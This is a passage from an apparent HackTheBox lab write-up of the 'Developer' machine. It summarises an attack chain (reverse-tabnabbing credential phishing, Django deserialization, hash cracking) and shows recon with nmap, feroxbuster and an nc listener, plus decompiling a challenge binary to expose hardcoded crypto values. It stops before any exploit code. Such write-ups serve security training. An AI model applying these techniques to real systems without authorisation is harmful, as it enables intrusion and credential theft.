# HTB-Developer-pwn

<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">



<p>Developer is a CTF platform modeled off of HackTheBox! When I sign up for an account, there are eight real challenges to play across four different categories. On solving one, I can submit a write-up link, which the admin will click. This link is vulnerable to reverse-tab-nabbing, a neat exploit where the writeup opens in a new window, but it can get the original window to redirect to a site of my choosing. I’ll make it look like it logged out, and capture credentials from the admin, giving me access to the Django admin panel and the Sentry application. I’ll crash that application to see Django is running in debug mode, and get the secret necessary to perform a deserialization attack, providing execution and a foothold on the box. I’ll dump the Django hashes from the Postgresql DB for Senty and crack them to get the creds for the next user. For root, there’s a sudo executable that I can reverse to get the password which leads to SSH access as root.</p>
<h2 id="box-stats">Box Stats</h2>

<table>
  <thead>
    <tr>
      <th>Name:</th>
      <th style="text-align: right"><a href="https://www.hackthebox.eu/home/machines/profile/372" style="color:white;">Developer</a> <picture><source type="image/webp" srcset="/icons/box-developer.webp"> <img src="/icons/box-developer.png" alt="Developer" class="img-av"></picture></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Release Date:</td>
      <td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1428011772049563655">21 Aug 2021</a></td>
    </tr>
    <tr>
      <td>Retire Date:</td>
      <td style="text-align: right">15 Jan 2022</td>
    </tr>
    <tr>
      <td>OS:</td>
      <td style="text-align: right">Linux <picture><source type="image/webp" srcset="/icons/Linux.webp"><img src="/icons/Linux.png" alt="Linux" class="img-os"></picture></td>
    </tr>
    <tr>
      <td>Base Points:</td>
      <td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
    </tr>
    <tr>
      <td>Rated Difficulty:</td>
      <td style="text-align: right"><picture><source type="image/webp" srcset="/img/developer-diff.webp"><img src="/img/developer-diff.png" alt="Rated difficulty for Developer" style="display: unset;"></picture></td>
    </tr>
    <tr>
      <td>Radar Graph:</td>
      <td style="text-align: right"><picture><source type="image/webp" srcset="/img/developer-radar.webp"><img src="/img/developer-radar.png" alt="Radar chart for Developer" style="display: unset;"></picture></td>
    </tr>
    <tr>
      <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp"><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset"></picture></td>
      <td style="text-align: right">00 days, 06 hours, 33 mins, 37 seconds <a href="https://www.hackthebox.eu/home/users/profile/87804"><img src="https://www.hackthebox.eu/badge/image/87804" alt="jazzpizazz" style="display: unset"></a></td>
    </tr>
    <tr>
      <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp"><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset"></picture></td>
      <td style="text-align: right">00 days, 07 hours, 12 mins, 42 seconds <a href="https://www.hackthebox.eu/home/users/profile/270601"><img src="https://www.hackthebox.eu/badge/image/270601" alt="0xCaue" style="display: unset"></a></td>
    </tr>
    <tr>
      <td>Creator:</td>
      <td style="text-align: right"><a href="https://www.hackthebox.eu/home/users/profile/114053"><img src="https://www.hackthebox.eu/badge/image/114053" alt="" style="display: unset"></a><br></td>
    </tr>
  </tbody>
</table>

<h2 id="recon">Recon</h2>

<h3 id="nmap">nmap</h3>

<p><code class="language-plaintext highlighter-rouge">nmap</code> found two open TCP ports, SSH (22) and HTTP (80):</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.103
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-12 17:37 EST
Nmap scan report for developer.htb (10.10.11.103)
Host is up (0.028s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.103
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-12 17:37 EST
Nmap scan report for developer.htb (10.10.11.103)
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Developer: Free CTF Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds
</span></code></pre></div></div>

<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu 20.04 Focal.</p>

<h3 id="website---tcp-80">Website - TCP 80</h3>

<h4 id="site">Site</h4>

<p>The site is a CTF platform:</p>

<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
  <a href="/img/image-20210712142803604.png">
    <img src="/img/image-20210712142803604.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)" alt="image-20210712142803604">
  </a>
  <div style="position: absolute; right: 20px; top: 375px"><a href="/img/image-20210712142803604.png"><i>Click for full image</i></a></div>
</div>

<p>All of the links on the page go to places in this front page, except for Login (<code class="language-plaintext highlighter-rouge">/accounts/login</code>) and Signup (<code class="language-plaintext highlighter-rouge">/accounts/signup</code>).</p>

<h4 id="account-pages">Account Pages</h4>

<p><code class="language-plaintext highlighter-rouge">/accounts/login</code> has a login for:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210712145414570.webp">
    <img src="/img/image-20210712145414570.png" alt="image-20210712145414570" class="include_image ">
</picture>

<p>There’s a potential domain there in developer.htb.</p>

<p>The forgot password link (<code class="language-plaintext highlighter-rouge">/accounts/password/reset</code>) gives another form:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210712145529593.webp">
    <img src="/img/image-20210712145529593.png" alt="image-20210712145529593" class="include_image ">
</picture>

<p>It will verify if an email address is in the system or not:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210712145556680.webp">
    <img src="/img/image-20210712145556680.png" alt="image-20210712145556680" class="include_image ">
</picture>

<p>Some quick guesses didn’t reveal any accounts (admin, administrator, root, dev, developer all returned negative).</p>

<p>The signup page has a form which I’ll fill in. When I try to submit with the password 0xdf, some client-side validation requires some password strength and a username of 5+ characters:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210712192618961.webp">
    <img src="/img/image-20210712192618961.png" alt="image-20210712192618961" class="include_image ">
</picture>

<p>On successfully creating an account, I’m at a dashboard for a CTF site with machine difficulties and challenge categories running down the left sidebar:</p>

<div style="max-height: 600px; overflow: hidden; position: relative; margin-bottom: 20px;">
  <a href="/img/image-20210712192904676.png">
    <img src="/img/image-20210712192904676.png" style="clip-path: polygon(0 0, 100% 0, 100% 560px, 49% 590px, 51% 570px, 0 600px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 560px, 49% 590px, 51% 570px, 0 600px)" alt="image-20210712192904676">
  </a>
  <div style="position: absolute; right: 20px; top: 575px"><a href="/img/image-20210712192904676.png"><i>Click for full image</i></a></div>
</div>

<p>The Machines section is all empty (says “coming soon”), but there are challenges across four categories (web is empty). For example, Forensics:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713062147287.webp">
    <img src="/img/image-20210713062147287.png" alt="image-20210713062147287" class="include_image ">
</picture>

<p>There are a total of eight, with some homage to some talented HTB players:</p>

<table>
  <thead>
    <tr>
      <th>Name</th>
      <th>Points</th>
      <th>Category</th>
      <th>Author</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>PSE</td>
      <td>10</td>
      <td>Forensic</td>
      <td>dmw0ng</td>
    </tr>
    <tr>
      <td>Phished List</td>
      <td>10</td>
      <td>Forensic</td>
      <td>jazzpizazz</td>
    </tr>
    <tr>
      <td>Lucky Guess</td>
      <td>10</td>
      <td>Reversing</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>RevMe</td>
      <td>10</td>
      <td>Reversing</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>Authentication</td>
      <td>20</td>
      <td>Reversing</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>PwnMe</td>
      <td>10</td>
      <td>Pwn</td>
      <td>clubby789</td>
    </tr>
    <tr>
      <td>Easy Encryption</td>
      <td>10</td>
      <td>Crypto</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>Triple Whammy</td>
      <td>10</td>
      <td>Crypto</td>
      <td>willwam845</td>
    </tr>
  </tbody>
</table>

<p>I’ll show solutions to all eight later, but on submitting a flag, the challenge now shows with a Completed tag, and the Submit Flag button now says Submit a Walkthrough:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713063016380.webp">
    <img src="/img/image-20210713063016380.png" alt="image-20210713063016380" class="include_image ">
</picture>

<p>Clicking that pops a window requesting a URL:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713062505012.webp">
    <img src="/img/image-20210713062505012.png" alt="image-20210713062505012" class="include_image ">
</picture>

<p>It also says the admins will check the walkthroughs, which is a good indication there’s some automated user interactions on this host.</p>

<p>I post my own URL, and immediate the link is on my profile page:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713064027850.webp">
    <img src="/img/image-20210713064027850.png" alt="image-20210713064027850" class="include_image ">
</picture>

<p>I’ve got <code class="language-plaintext highlighter-rouge">nc</code> listening on 80, but no immediate response. Then, within a couple minutes, there’s a connection:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 80
<span class="go">listening on [any] 80 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.120] 35462
GET /test2 HTTP/1.1
Host: 10.10.14.6
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
</span></code></pre></div></div>

<p>Leaving a Python webserver open, the link is clicked every two minutes or so.</p>

<h4 id="tech-stack">Tech Stack</h4>

<p>The HTTP response headers don’t give much information about how the site is hosted other than the Apache version.</p>

<p>The page source doesn’t give much else either. There is an uninitialized Google Analytics script block at the bottom of the page:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="c">&lt;!-- Google Analytics: change UA-XXXXX-X to be your site's ID. --&gt;</span>
		<span class="nt">&lt;script&gt;</span>
		<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span><span class="nx">o</span><span class="p">,</span><span class="nx">i</span><span class="p">,</span><span class="nx">l</span><span class="p">,</span><span class="nx">e</span><span class="p">,</span><span class="nx">r</span><span class="p">){</span><span class="nx">b</span><span class="p">.</span><span class="nx">GoogleAnalyticsObject</span><span class="o">=</span><span class="nx">l</span><span class="p">;</span><span class="nx">b</span><span class="p">[</span><span class="nx">l</span><span class="p">]</span><span class="o">||</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="nx">l</span><span class="p">]</span><span class="o">=</span>
		<span class="kd">function</span><span class="p">(){(</span><span class="nx">b</span><span class="p">[</span><span class="nx">l</span><span class="p">].</span><span class="nx">q</span><span class="o">=</span><span class="nx">b</span><span class="p">[</span><span class="nx">l</span><span class="p">].</span><span class="nx">q</span><span class="o">||</span><span class="p">[]).</span><span class="nx">push</span><span class="p">(</span><span class="nx">arguments</span><span class="p">)});</span><span class="nx">b</span><span class="p">[</span><span class="nx">l</span><span class="p">].</span><span class="nx">l</span><span class="o">=+</span><span class="k">new</span> <span class="nb">Date</span><span class="p">;</span>
		<span class="nx">e</span><span class="o">=</span><span class="nx">o</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span><span class="nx">r</span><span class="o">=</span><span class="nx">o</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="nx">i</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
		<span class="nx">e</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="dl">'</span><span class="s1">//www.google-analytics.com/analytics.js</span><span class="dl">'</span><span class="p">;</span>
		<span class="nx">r</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">r</span><span class="p">)}(</span><span class="nb">window</span><span class="p">,</span><span class="nb">document</span><span class="p">,</span><span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">ga</span><span class="dl">'</span><span class="p">));</span>
		<span class="nx">ga</span><span class="p">(</span><span class="dl">'</span><span class="s1">create</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">UA-XXXXX-X</span><span class="dl">'</span><span class="p">);</span><span class="nx">ga</span><span class="p">(</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">pageview</span><span class="dl">'</span><span class="p">);</span>
		<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>It’s not clear if that’s part of the client-side template the site uses or part of the framework running server side to include that.</p>

<p>Noticing paths like <code class="language-plaintext highlighter-rouge">/accounts/login</code>, I checked <code class="language-plaintext highlighter-rouge">/accounts</code> and <code class="language-plaintext highlighter-rouge">/accounts/</code>. Both returned 404, which wouldn’t make sense for something like PHP, but would make sense for some of the Python or Ruby frameworks.</p>

<h4 id="directory-brute-force">Directory Brute Force</h4>

<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and immediately I get a ton of 302s inside folders like <code class="language-plaintext highlighter-rouge">newadmin</code>, <code class="language-plaintext highlighter-rouge">comadmin</code>, <code class="language-plaintext highlighter-rouge">superadmin</code>, <code class="language-plaintext highlighter-rouge">mysql_admin</code>. I’ll re-run with <code class="language-plaintext highlighter-rouge">-C 302</code> to get rid of that clutter:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.10.120 <span class="nt">-C</span> 302
<span class="go">
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.120
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💢  Status Code Filters   │ [302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        0l        0w        0c http://10.10.10.120/metaadmin
301        0l        0w        0c http://10.10.10.120/useradmin
301        0l        0w        0c http://10.10.10.120/db_admin
301        0l        0w        0c http://10.10.10.120/blogadmin
301        0l        0w        0c http://10.10.10.120/_phpmyadmin
301        0l        0w        0c http://10.10.10.120/creo_admin
301        0l        0w        0c http://10.10.10.120/phpldapadmin
301        0l        0w        0c http://10.10.10.120/pn-admin
301        0l        0w        0c http://10.10.10.120/as-admin
301        0l        0w        0c http://10.10.10.120/iadmin
301        0l        0w        0c http://10.10.10.120/ssadmin
301        0l        0w        0c http://10.10.10.120/os_admin
301        0l        0w        0c http://10.10.10.120/csadmin
301        0l        0w        0c http://10.10.10.120/contentadmin
301        0l        0w        0c http://10.10.10.120/content_admin
301        0l        0w        0c http://10.10.10.120/eadmin
301        0l        0w        0c http://10.10.10.120/site_admin
301        0l        0w        0c http://10.10.10.120/superadmin
301        0l        0w        0c http://10.10.10.120/bb-admin
301        0l        0w        0c http://10.10.10.120/my_admin
[####################] - 1m    629979/629979  0s      found:20      errors:585276 
[####################] - 1m     29999/29999   477/s   http://10.10.10.120
[####################] - 1m     29999/29999   495/s   http://10.10.10.120/metaadmin
[####################] - 1m     29999/29999   451/s   http://10.10.10.120/useradmin
[####################] - 57s    29999/29999   526/s   http://10.10.10.120/db_admin
[####################] - 1m     29999/29999   449/s   http://10.10.10.120/blogadmin
[####################] - 57s    29999/29999   546/s   http://10.10.10.120/_phpmyadmin
[####################] - 1m     29999/29999   490/s   http://10.10.10.120/creo_admin
[####################] - 1m     29999/29999   493/s   http://10.10.10.120/phpldapadmin
[####################] - 48s    29999/29999   631/s   http://10.10.10.120/pn-admin
[####################] - 34s    29999/29999   907/s   http://10.10.10.120/as-admin
[####################] - 42s    29999/29999   783/s   http://10.10.10.120/iadmin
[####################] - 59s    29999/29999   520/s   http://10.10.10.120/ssadmin
[####################] - 35s    29999/29999   855/s   http://10.10.10.120/os_admin
[####################] - 55s    29999/29999   536/s   http://10.10.10.120/csadmin
[####################] - 37s    29999/29999   788/s   http://10.10.10.120/contentadmin
[####################] - 21s    29999/29999   1781/s  http://10.10.10.120/content_admin
[####################] - 27s    29999/29999   1080/s  http://10.10.10.120/eadmin
[####################] - 21s    29999/29999   1634/s  http://10.10.10.120/site_admin
[####################] - 23s    29999/29999   1284/s  http://10.10.10.120/superadmin
[####################] - 24s    29999/29999   1248/s  http://10.10.10.120/bb-admin
[####################] - 21s    29999/29999   1383/s  http://10.10.10.120/my_admin
</span></code></pre></div></div>

<p>It looks like anything ending in <code class="language-plaintext highlighter-rouge">admin</code> is given a 301. Testing it in Firefox confirms that anything ending in <code class="language-plaintext highlighter-rouge">admin</code> (such as <code class="language-plaintext highlighter-rouge">0xdfadmin</code>) redirects to <code class="language-plaintext highlighter-rouge">/admin/login/?next=[entered url]</code>. This is the Django admin login page:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210712145211440.webp">
    <img src="/img/image-20210712145211440.png" alt="image-20210712145211440" class="include_image ">
</picture>

<p>Some quick password guessing doesn’t work, but at least I know it’s <a href="https://www.djangoproject.com/">Django</a>, a Python-based web framework.</p>

<h3 id="challenges">Challenges</h3>

<p>To complete the box, I’ll need to solve at least one challenge to enable the option to submit a writeup. I’m just going to show the quickest path to getting the flag for each, but they are each neat little games on their own.</p>

<h4 id="pse">PSE</h4>

<p>The challenge provides an encrypted string and download:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20220112175028311.webp">
    <img src="/img/image-20220112175028311.png" alt="image-20220112175028311" class="include_image ">
</picture>

<p>The download is a Windows .NET executable:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>file Encryption.exe 
<span class="go">Encryption.exe: PE32+ executable (GUI) x86-64 Mono/.Net assembly, for MS Windows
</span></code></pre></div></div>

<p>On running it in a Windows VM, it pops a dialog asking for a password:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713111803252.webp">
    <img src="/img/image-20210713111803252.png" alt="image-20210713111803252" class="include_image ">
</picture>

<p>Entering data into the top field and clicking ok puts the “encrypted” version into the bottom field:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713111907616.webp">
    <img src="/img/image-20210713111907616.png" alt="image-20210713111907616" class="include_image ">
</picture>

<p>Opening the binary in <a href="https://github.com/dnSpy/dnSpy">DNSpy</a>, there’s a bunch of stuff I need to ignore, and the <code class="language-plaintext highlighter-rouge">main</code> in <code class="language-plaintext highlighter-rouge">PS2EXE</code>:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713135918965.webp">
    <img src="/img/image-20210713135918965.png" alt="image-20210713135918965" class="include_image ">
</picture>

<p>A bit into <code class="language-plaintext highlighter-rouge">main</code>, there’s a base64 blob that gets decoded:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713135947109.webp">
    <img src="/img/image-20210713135947109.png" alt="image-20210713135947109" class="include_image ">
</picture>

<p>And then passed into a <code class="language-plaintext highlighter-rouge">PowerShell</code> object:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210713140014218.webp">
    <img src="/img/image-20210713140014218.png" alt="image-20210713140014218" class="include_image ">
</picture>

<p>I can decode that to get some PowerShell.</p>

<p><a href="https://github.com/studoot/ps2exe">ps2exe</a> is a way to compile a PowerShell script into an executable file. The <a href="https://github.com/studoot/ps2exe/blob/master/Readme.txt">Readme.txt</a> file on that repo also has a useful hint:</p>

<blockquote>
  <p>Password security:
Never store passwords in your compiled script! One can simply decompile the script with the parameter -extract. For example
Output.exe -extract:C:\Output.ps1
will decompile the script stored in Output.exe.</p>
</blockquote>

<p>I can get the same output by running:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS &gt;</span><span class="o">.</span><span class="n">\Encryption.exe</span><span class="w"> </span><span class="nt">-extract</span><span class="p">:</span><span class="o">.</span><span class="nx">\Encryption.ps1</span><span class="w">
</span></code></pre></div></div>

<p>Either way, the following comes out:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.Assembly</span><span class="p">]::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s2">"System.Drawing"</span><span class="p">)</span><span class="w"> 
</span><span class="p">[</span><span class="n">void</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.Assembly</span><span class="p">]::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s2">"System.Windows.Forms"</span><span class="p">)</span><span class="w"> 
</span><span class="p">[</span><span class="n">Reflection.Assembly</span><span class="p">]::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s2">"System.Security"</span><span class="p">)</span><span class="w"> 

</span><span class="kr">function</span><span class="w"> </span><span class="nf">Encrypt-String</span><span class="p">(</span><span class="nv">$String</span><span class="p">,</span><span class="w"> </span><span class="nv">$Passphrase</span><span class="p">,</span><span class="w"> </span><span class="nv">$salt</span><span class="o">=</span><span class="s2">"CrazilySimpleSalt"</span><span class="p">,</span><span class="w"> </span><span class="nv">$init</span><span class="o">=</span><span class="s2">"StupidlyEasy_IV"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">switch</span><span class="p">]</span><span class="nv">$arrayOutput</span><span class="p">)</span><span class="w"> 
</span><span class="p">{</span><span class="w"> 
    </span><span class="nv">$r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-Object</span><span class="w"> </span><span class="nx">System.Security.Cryptography.RijndaelManaged</span><span class="w"> 
    </span><span class="nv">$pass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$Passphrase</span><span class="p">)</span><span class="w"> 
    </span><span class="nv">$salt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$salt</span><span class="p">)</span><span class="w"> 
 
    </span><span class="nv">$r</span><span class="o">.</span><span class="nf">Key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">new-Object</span><span class="w"> </span><span class="nx">Security.Cryptography.PasswordDeriveBytes</span><span class="w"> </span><span class="nv">$pass</span><span class="p">,</span><span class="w"> </span><span class="nv">$salt</span><span class="p">,</span><span class="w"> </span><span class="s2">"SHA1"</span><span class="p">,</span><span class="w"> </span><span class="nx">5</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nx">32</span><span class="p">)</span><span class="w">
    </span><span class="nv">$r</span><span class="o">.</span><span class="nf">IV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">new-Object</span><span class="w"> </span><span class="nx">Security.Cryptography.SHA1Managed</span><span class="p">)</span><span class="o">.</span><span class="nf">ComputeHash</span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">Text.Encoding</span><span class="p">]::</span><span class="nx">UTF8.GetBytes</span><span class="p">(</span><span class="nv">$init</span><span class="p">)</span><span class="w"> </span><span class="p">)[</span><span class="mi">0</span><span class="o">..</span><span class="mi">15</span><span class="p">]</span><span class="w"> 
       
    </span><span class="nv">$c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$r</span><span class="o">.</span><span class="nf">CreateEncryptor</span><span class="p">()</span><span class="w"> 
    </span><span class="nv">$ms</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-Object</span><span class="w"> </span><span class="nx">IO.MemoryStream</span><span class="w"> 
    </span><span class="nv">$cs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-Object</span><span class="w"> </span><span class="nx">Security.Cryptography.CryptoStream</span><span class="w"> </span><span class="nv">$ms</span><span class="p">,</span><span class="nv">$c</span><span class="p">,</span><span class="s2">"Write"</span><span class="w"> 
    </span><span class="nv">$sw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-Object</span><span class="w"> </span><span class="nx">IO.StreamWriter</span><span class="w"> </span><span class="nv">$cs</span><span class="w"> 
    </span><span class="nv">$sw</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$String</span><span class="p">)</span><span class="w"> 
    </span><span class="nv">$sw</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w"> 
    </span><span class="nv">$cs</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w"> 
    </span><span class="nv">$ms</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">  
    </span><span class="nv">$r</span><span class="o">.</span><span class="nf">Clear</span><span class="p">()</span><span class="w"> 
    </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$ms</span><span class="o">.</span><span class="nf">ToArray</span><span class="p">()</span><span class="w"> 
    </span><span class="kr">return</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="w"> 
</span><span class="p">}</span><span class="w">

</span><span class="nv">$objForm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Windows.Forms.Form</span><span class="w"> 
</span><span class="nv">$objForm</span><span class="o">.</span><span class="nf">Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Data Encryption"</span><span class="w">
</span><span class="nv">$objForm</span><span class="o">.</span><span class="nf">Size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Drawing.Size</span><span class="p">(</span><span class="mi">300</span><span class="p">,</span><span class="mi">250</span><span class="p">)</span><span class="w"> 
</span><span class="nv">$objForm</span><span class="o">.</span><span class="nf">StartPosition</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"CenterScreen"</span><span class="w">

</span><span class="nv">$OKButton</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Windows.Forms.Button</span><span class="w">
</span><span class="nv">$OKButton</span><span class="o">.</span><span class="nf">Location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Drawing.Size</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span><span class="mi">160</span><span class="p">)</span><span class="w">
</span><span class="nv">$OKButton</span><span class="o">.</span><span class="nf">Size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Drawing.Size</span><span class="p">(</span><span class="mi">75</span><span class="p">,</span><span class="mi">23</span><span class="p">)</span><span class="w">
</span><span class="nv">$OKButton</span><span class="o">.</span><span class="nf">Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"OK"</span><span class="w">
</span><span class="nv">$OKButton</span><span class="o">.</span><span class="nf">Add_Click</span><span class="p">(</span><span class="w">
</span><span class="p">{</span><span class="w">
</span><span class="nv">$string</span><span class="o">=</span><span class="nv">$objTextBoxincnum</span><span class="o">.</span><span class="nf">Text</span><span class="w">
</span><span class="nv">$encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Encrypt-String</span><span class="w"> </span><span class="nv">$string</span><span class="w"> </span><span class="s2">"AmazinglyStrongPassword"</span><span class="w">
</span><span class="nv">$objTextBoxincdes</span><span class="o">.</span><span class="nf">Text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$encrypted</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="p">)</span><span class="w">
